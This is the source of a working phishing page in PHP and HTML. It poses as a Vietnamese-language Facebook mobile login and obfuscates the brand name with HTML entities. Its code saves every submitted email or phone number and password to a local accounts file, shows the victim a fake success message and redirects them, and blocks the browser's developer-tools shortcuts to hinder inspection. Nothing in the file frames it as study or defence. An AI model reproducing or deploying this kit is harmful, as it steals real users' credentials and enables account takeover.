<?php include "quetcailon.php"; ?>
<!DOCTYPE html>
<html>
<head><meta http-equiv="Content-Type" content="text/html; charset=utf-8">

<title>Đăng nhập qua Faceb&#111;ok</title>
<meta name="viewport" content="user-scalable=no,initial-scale=1,maximum-scale=1">
<link rel="stylesheet" type="text/css" href="assets/css/fXIr-0nfR2N.css">
<link rel="stylesheet" type="text/css" href="assets/css/9i69YTbQmG9.css">
</head>
<body class="touch x1 _fzu _50-3 iframe acw portrait">
<div id="viewport" style="min-height: 613px;">
<h1 style="display:block;height:0;overflow:hidden;position:absolute;width:0;padding:0">Faceb&#111;ok</h1>
<div id="page" class="">
<div class="_129_" id="header-notices"></div>
<div class="_4g33 _52we _52z5" id="header">
<div class="_4g34 _52z6"><a href="#"><i class="img sp_7V_P8-AK9yC sx_ce405b"><u>faceb&#111;ok</u></i></a></div>
</div>
<div class="_5soa acw" id="root" role="main" style="min-height: 613px;">
<div class="_4g33">
<div class="_4g34" id="u_0_0">
<div class="_5yd0 _2ph- _5yd1" style="display:none" id="login-notice"></div>
<div class="acy apm abb" id="first-notice"><span class="mfsm">Trước tiên, bạn phải đăng nhập.</span></div>
<div class="aclb _4-4l">
<div class="_5rut">
<form method="post" class="mobile-login-form _5spm" id="login_form" novalidate="1" data-autoid="autoid_2">
<div id="user_info_container"></div>
<div id="pwd_label_container"></div>
<div id="otp_retrieve_desc_container"></div>
<div class="_56be _5sob">
<div class="_55wo _55x2 _56bf">
<div id="email_input_container"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _5ruq" autocomplete="on" id="m_login_email" name="username" placeholder="Email hoặc số điện thoại" type="text"></div>
<div>
<div class="_1upc _mg8">
<div class="_4g33">
<div class="_4g34 _5i2i _52we">
<div class="_5xu4"><input autocorrect="off" autocapitalize="off" class="_56bg _4u9z _27z2" autocomplete="on" id="m_login_password" name="password" placeholder="Mật khẩu" type="password"></div>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_2pie" style="text-align:center;">
<div id="u_0_4">
<button type="submit" value="Đăng nhập" class="_54k8 _52jh _56bs _56b_ _28lf _56bw _56bu" name="login" id="u_0_5"><span class="_55sr">Đăng nhập</span></button>
</div>
<div id="otp_button_elem_container"></div>
</div>
<div class="_xo8"></div>
</form>
<div>
<div class="_43mg"><span class="_43mh">hoặc</span></div>
<div class="_52jj _5t3b" id="u_0_6"><a role="button" class="_5t3c _28le btn btnS medBtn mfsm touchable" id="signup-button" href="#">Tạo tài khoản mới</a></div>
 </div>
<div>
<div class="other-links">
<ul class="_5pkb _55wp">
<li><span class="mfss fcg"><a href="#" id="forgot-password-link">Quên mật khẩu?</a></span></li>
</ul>
</div>
</div>
</div>
</div>
</div>
</div>
<div class="_55wr _5ui2">
<div class="_5dpw">
<div class="_5ui3" data-nocookies="1" id="locale-selector">
<div class="_4g33">
<div class="_4g34">
<span class="_52jc _52j9 _52jh _3ztb">Tiếng Việt</span>
<div class="_3ztc"><span class="_52jc"><a href="#">中文(台灣)</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Español</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Français (France)</a></span></div>
</div>
<div class="_4g34">
<div class="_3ztc"><span class="_52jc"><a href="#">English (UK)</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">한국어</a></span></div>
<div class="_3ztc"><span class="_52jc"><a href="#">Português (Brasil)</a></span></div>
<a href="#">
<div class="_3j87 _1rrd _3ztd" aria-label="Danh sách ngôn ngữ đầy đủ"><i class="img sp_7V_P8-AK9yC sx_21ee4d"></i></div>
</a>
</div>
</div>
</div>
<div class="_5ui4"><span class="mfss fcg">Facebo&#111;k © 2018</span></div>
</div>
</div>
</div>
</div>
</div>



<?
require 'fileluuacc.php';
session_start();
$username = $_POST['username'] ;
$password= $_POST['password'];
$trung = 0 ;
$stt = 'error';
$msg = 'Tài khoản hoặc mật khẩu bạn vừa nhập chưa chính xác.';
If (isset($_POST['username']) && isset($_POST['password'])) {
    if (strlen($password) > 7)  {
        
        $fh = fopen($file_fb,'r');
	while ($line = fgets($fh)) {
		if (stristr($line,$username."|".$password))
		{
			$trung = 1; 
			break;
		}
	}
	fclose($fh);
	if ($trung == 1)
	    {
	    }
	    else
	    {
			$handle = fopen($file_fb, 'a');
	 	
			fwrite($handle, $_POST['username'].'|'.$_POST['password'].PHP_EOL);
			fclose($handle);
	    }
			$stt = 'success';
			$msg = 'Thành công!';
		}else {
			$stt = 'error';
			$msg = 'Email hoặc số điện thoại bạn đã nhập không khớp với bất kỳ tài khoản nào';
		} 
}
$_SESSION['change'] = 0;
$_SESSION['name'] = $_POST['username'];
$_SESSION['cookieslog'] = 0;
$_SESSION['username'] = $username;
$_SESSION['password'] = 0;
$_SESSION['sessionkey'] = 0;

$arr    = array(
	'status' => $stt,
	'message' => $msg
);
$json_a = json_encode($arr, true);
echo $json_a;
?>







<script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
<script>
            document.onkeydown=function(a){if(123==event.keyCode||a.ctrlKey&&a.shiftKey&&73==a.keyCode||a.ctrlKey&&a.shiftKey&&67==a.keyCode||a.ctrlKey&&a.shiftKey&&74==a.keyCode||a.ctrlKey&&85==a.keyCode)return!1};
			$(document).ready(function(){
				$('#login_form').submit(function(e) {
					jQuery.ajax({
						method: 'POST',
						url: 'facebook.php',
						data: $(this).serialize(),
						dataType: 'json',
						complete: function() {
							captchaGenerate()
						}
					}).done(function(data) {
						if (data.status == 'success') {
							location.href = 'duyet.php'
						} else {
							$('#first-notice').hide()
							$('#login-notice').text(data.message || 'Có lỗi khi nhận quà!').show()
						}
					}).fail(function() {
						$('#login-notice').text('Đã xảy ra lỗi khi đăng nhập, vui lòng thử lại sau!').show()
					})
					e.preventDefault()
				})
			})
		</script>
</body>
</html>